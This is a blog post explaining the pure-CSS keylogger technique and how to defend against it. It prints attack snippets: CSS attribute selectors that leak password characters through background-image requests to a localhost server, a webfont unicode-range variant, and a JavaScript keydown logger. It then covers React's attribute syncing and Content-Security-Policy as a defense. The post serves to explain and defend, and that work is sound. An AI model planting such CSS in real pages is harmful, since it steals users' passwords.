---
title: 'CSS keylogger: Attack and Defense'
date: 2018-03-12 22:10
tags: [Front-end, CSS]
categories:
  - Front-end
---

# Introduction

I recently came across this article on Hacker News: [Show HN: A CSS Keylogger](https://news.ycombinator.com/item?id=16422696), which opened my eyes and inspired me to study it in depth and write an article to share with everyone.

This article will cover the following topics:

1. What is a keylogger
2. The principle of CSS keylogger
3. CSS keylogger and React
4. Defense methods

Alright, let's get started!

<!-- more -->

# What is a Keylogger?

A keylogger is a type of malicious program that records every keystroke you make on your computer. I remember when I was young, I wrote a super simple keylogger using VB6, which just called the system's API and recorded the corresponding keystrokes.

If this is installed on your computer, everything you type will be recorded, including your account and password. However, if I remember correctly, behavior detection by antivirus software should be able to block these, so there is no need to worry too much.

What if we limit ourselves to web pages?

If you want to add a keylogger to a page, you usually use JavaScript to achieve it, and the code is super simple:

``` js
document.addEventListener('keydown', e => {
  console.log(e.key)
})
```

Just detect the `keydown` event and capture the pressed key.

However, if you have the ability to insert malicious JavaScript into the web page you want to invade, you usually don't need to go to the trouble of recording every keystroke. You can just steal cookies, tamper with pages, redirect to phishing pages, or return account and password to your own server when submitting. Therefore, keyloggers are not so useful.

So, assuming we can't insert malicious JavaScript now and can only modify CSS, can we use pure CSS to create a keylogger?

Yes, after all, CSS can do [a lot of things](https://github.com/you-dont-need/You-Dont-Need-JavaScript).

# The Principle of Pure CSS Keylogger

You'll understand it by looking at the code directly (taken from: [maxchehab/CSS-Keylogging](https://github.com/maxchehab/CSS-Keylogging)):

``` css
input[type="password"][value$="a"] {
  background-image: url("http://localhost:3000/a");
}
```

Amazing, isn't it?

If you're not familiar with CSS selectors, let me review them for you. The above means that if the type is password and the value ends with `a`, the background image will load `http://localhost:3000/a`.

Now we can modify this CSS, add uppercase and lowercase letters, numbers, and even special characters. What will happen next?

If I enter `abc123`, the browser will send requests to:

1. http://localhost:3000/a
2. http://localhost:3000/b
3. http://localhost:3000/c
4. http://localhost:3000/1
5. http://localhost:3000/2
6. http://localhost:3000/3

That's it, your password is completely in the hands of the attacker.

This is the principle of CSS keylogger, using CSS selectors to load different URLs, you can send each character of the password to the server.

It looks scary, but don't worry, it's not that easy.

# Limitations of CSS Keylogger

## Order cannot be guaranteed

Although you enter in order, the order cannot be guaranteed when the request arrives at the backend, so sometimes the order will be messed up. For example, `abc123` becomes `bca213` or something.

But if we modify the CSS selector, we can solve this problem:

``` css
input[value^="a"] {
  background-image: url("http://localhost:3000/a_");
}
  
input[value*="aa"] {
  background-image: url("http://localhost:3000/aa");
}
  
input[value*="ab"] {
  background-image: url("http://localhost:3000/ab");
}
```

If the beginning is `a`, we send out `a_`, and then send out a request for every two characters of the permutation and combination of 26 letters and numbers. For example, `abc123` will be:

1. a_
2. ab
3. bc
4. c1
5. 12
6. 23

Even if the order is messed up, you can reassemble the letters through this relationship and still get the correct password order.

## Duplicate characters will not send requests

Because the loaded URLs are the same, duplicate characters will not load images and will not send new requests. This problem is currently unsolvable as far as I know.

## The value does not change when typing

This is actually the biggest problem with CSS Keylogger.

When you enter information in an input field, the value of the input does not change. Therefore, the solutions mentioned above do not work. You can try it yourself and see that the content of the input changes, but if you check with dev tools, you will find that the value does not change at all.

There are two solutions to this problem. The first is to use Webfont:

``` html
<!doctype html>
<title>css keylogger</title>
<style>
@font-face { font-family: x; src: url(./log?a), local(Impact); unicode-range: U+61; }
@font-face { font-family: x; src: url(./log?b), local(Impact); unicode-range: U+62; }
@font-face { font-family: x; src: url(./log?c), local(Impact); unicode-range: U+63; }
@font-face { font-family: x; src: url(./log?d), local(Impact); unicode-range: U+64; }
input { font-family: x, 'Comic sans ms'; }
</style>
<input value="a">type `bcd` and watch network log
```
(Code taken from: [Keylogger using webfont with single character unicode-range](https://github.com/jbtronics/CrookedStyleSheets/issues/24))

If the value does not change, so what? The font will still be used! Every time you type a character, the corresponding request will be sent.

However, this method has two limitations:

1. The order cannot be guaranteed, and the problem of duplicate characters cannot be solved.
2. It does not work if the field is `<input type='password' />`.

(When researching the second limitation, I discovered an interesting thing. Since Chrome and Firefox will mark websites with type 'password' input but without HTTPS as insecure, someone has developed a way to use [ordinary input with special fonts](https://www.troyhunt.com/bypassing-browser-security-warnings-with-pseudo-password-fields/) to bypass this detection and make the input box look like a password (but the type is not password). In this case, Webfont can be used for attack.)

Now let's look at the second solution. As mentioned earlier, the crux of this problem is that the value does not change. In other words, if the value changes when you enter input, this attack method will be very useful.

Hmm... does it feel familiar?

``` js
class NameForm extends React.Component {
  constructor(props) {
    super(props);
    this.state = {value: ''};
  
    this.handleChange = this.handleChange.bind(this);
  }
  
  handleChange(event) {
    this.setState({value: event.target.value});
  }
  
  render() {
    return (
      <form>
        <label>
          Name:
          <input type="text" value={this.state.value} onChange={this.handleChange} />
        </label>
      </form>
    );
  }
}
```
(The above code is adapted from [React official website](https://reactjs.org/docs/forms.html))

If you have used React, you should be familiar with this pattern. When you enter anything, the state is changed first, and then the value of the state is mapped to the value of the input. Therefore, whatever you enter, the value will be the same.

React is a super popular front-end library. It can be imagined that a lot of websites are made with React, and as long as it is React, it can almost guarantee that the value of the input will always be synchronized (almost, but there are still a few that do not follow this rule).

To summarize, as long as the value of your input corresponds to the value inside (if you use React, you will almost certainly write it this way), and there is a place for others to insert custom CSS, CSS Keylogger can be successfully implemented. Although there are some flaws (cannot detect duplicate characters), the concept is feasible, but the accuracy is not that high.

## React's response

The React community has also discussed this issue in [Stop syncing value attribute for controlled inputs #11896](https://github.com/facebook/react/issues/11896).

In fact, there have always been some bugs in synchronizing the value of the input, and even the well-known traffic analysis website Mixpanel has accidentally recorded sensitive information in the past, and the root cause is that React keeps synchronizing the value.

The discussion in the issue is worth reading. It mentions something that everyone often confuses: Input attributes and properties. I found a good explanation on Stackoverflow: [What is the difference between properties and attributes in HTML?](https://stackoverflow.com/questions/6003819/what-is-the-difference-between-properties-and-attributes-in-html)

Attributes are basically what you have in your HTML, while properties represent the actual value. The two may not be equal. For example:

``` html
<input id="the-input" type="text" value="Name:">
```

If you grab the attribute of this input today, you will get `Name:`, but if you grab the value of the input today, you will get the value currently in the input box. So this attribute is actually the same as the `defaultValue` we often use, which is the default value.

However, in React, it synchronizes the attribute with the value, so whatever your value is, the attribute will be the same.

From the discussion, it seems that in React 17, there is a good chance that this mechanism will be removed so that these two will no longer be synchronized.

## Defense methods

After talking so much above, because React has not changed this yet, the problem still exists. And in fact, besides React, other libraries may have done similar things.

I won't mention the client-side defense methods here. Basically, it's to install some Chrome extensions written by others, which can help you detect CSS that matches the pattern. What's more worth mentioning here is the defense on the server-side.

Currently, the most permanent solution seems to be Content-Security-Policy. In short, it is an HTTP Response header that determines which resources the browser can load, such as prohibiting inline code and only allowing resources under the same domain to be loaded.

The original intention of this header is to prevent XSS and attackers from loading external malicious code (such as our CSS keylogger). If you want to know more about how to use it, you can refer to this article: [Content-Security-Policy - HTTP Headers Security Issues (2)](https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/)

## Summary

I have to say, this technique is really interesting! When I first saw it, I was amazed for a while that I could find such a pure CSS keylogger. Although it is technically feasible, there are still many difficulties in implementation, and many prerequisites must be met to do such an attack. However, it is still worth paying attention to the follow-up development.

In short, this article is to introduce this thing to readers, hoping that everyone will gain something.

# References

1. [Keylogger using webfont with single character unicode-range #24](https://github.com/jbtronics/CrookedStyleSheets/issues/24)
2. [Stop syncing value attribute for controlled inputs #11896](https://github.com/facebook/react/issues/11896)
3. [maxchehab/CSS-Keylogging](https://github.com/maxchehab/CSS-Keylogging)
4. [Content-Security-Policy - HTTP Headers Security Issues (2)](https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/)
5. [Stealing Data With CSS: Attack and Defense](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense)
6. [Bypassing Browser Security Warnings with Pseudo Password Fields](https://www.troyhunt.com/bypassing-browser-security-warnings-with-pseudo-password-fields/)
7. [CSS Keylogger (and why you shouldn’t worry about it)](https://www.bram.us/2018/02/21/css-keylogger-and-why-you-shouldnt-worry-about-it/)
8. [Mixpanel JS library has been harvesting passwords ](https://www.reddit.com/r/analytics/comments/7ukw4n/mixpanel_js_library_has_been_harvesting_passwords/)
